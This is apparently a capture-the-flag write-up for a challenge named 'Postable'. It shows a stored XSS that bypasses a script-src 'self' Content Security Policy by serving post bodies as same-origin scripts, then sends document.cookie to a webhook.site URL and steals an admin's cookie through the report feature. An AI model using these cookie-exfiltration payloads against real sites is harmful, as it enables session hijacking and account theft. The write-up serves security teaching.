# Postable
## http://problems.getpwning.com:7070/

Creating an account and logging in gives us a form we can use to submit "posts".
When a post is made it will show up in your feed. Each post has a permalink button that will give you a URL for that post, 
and a report button that will flag the post for an admin to look at.

Trying some basic XSS in posts shows that the post bodies are not being sanitised, but trying to inject scripts does not appear to do anything.
Looking in the deveoper console shows that scripts are being blocked by a [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy) rule.

Looking at the response headers we can see that the CSP header that is causing us trouble:
```
HTTP/1.1 304 Not Modified
X-Powered-By: Express
Content-Security-Policy: 
    script-src   'self';
    frame-src    'self';
    style-src    'self' https://fonts.googleapis.com/;
    font-src      https://fonts.gstatic.com/;
ETag: W/"54-jpVpAbPL4eUzydTTc3bEdAgXT1I"
Date: Sat, 23 Feb 2019 11:59:06 GMT
Connection: keep-alive
```
__script-src   'self'__ means we can only load script from the same origin as the document (http://problems.getpwning.com:7070/), _not_ inline or from an attacker-controlled server.

So if we want to do XSS we need to find a way to make the script originate from this site, but not as an inline script.

If we create a post with a script in the body, what do we get when we load that post?

```
http://problems.getpwning.com:7070/permalink?post=5c712e86a3c090310f2cee09
alert("hello")
```

We get just the body text (the script) back. So this is now a script with the same origin as the document.
We should now be able to load the script using XSS:

```
http://problems.getpwning.com:7070/permalink?post=5c712eada3c0906e452cee0a
<script src = "http://problems.getpwning.com:7070/permalink?post=5c712e86a3c090310f2cee09"></script>
```

And we see an alert box pop up.

Now we need to create a script that will call a resource we control. I am using [webhook.site](http://webhook.site) to monitor requests.
```
http://problems.getpwning.com:7070/permalink?post=5c713094a3c0906f8f2cee0e
fetch("http://webhook.site/ee5fbe15-1ccd-4a30-9b60-cd05cb92f240/")
```
Then use this as the script source in another post:
```
http://problems.getpwning.com:7070/permalink?post=5c7130bda3c090425b2cee0f
<script src = "http://problems.getpwning.com:7070/permalink?post=5c713094a3c0906f8f2cee0e"></script>
```

And we see a cross-site request is made to our server. Now we can change the script to steal the users cookies (where we suspect the flag is, or IRL where a users login token might be)

```
http://problems.getpwning.com:7070/permalink?post=5c71311ba3c090d8492cee11
fetch("http://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx/" + document.cookie)
```
```
http://problems.getpwning.com:7070/permalink?post=5c71312ea3c09012d62cee12
<script src = "http://problems.getpwning.com:7070/permalink?post=5c71311ba3c090d8492cee11"></script>
```
Now when we load the page we see a request made to: ```http://webhook.site/ee5fbe15-1ccd-4a30-9b60-cd05cb92f240/token=....;%20user-auth=....```
Because its us viewing the post these are our own cookies (no help whatsoever) - we need to get an admin to view the post.

Reporting the post gets an admin to look at it, and we see the request to our server with the admin cookie - the flag.
```
http://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx/flag=CTF%7Bcreative-people-solve-crazy-security-problems%7D
```
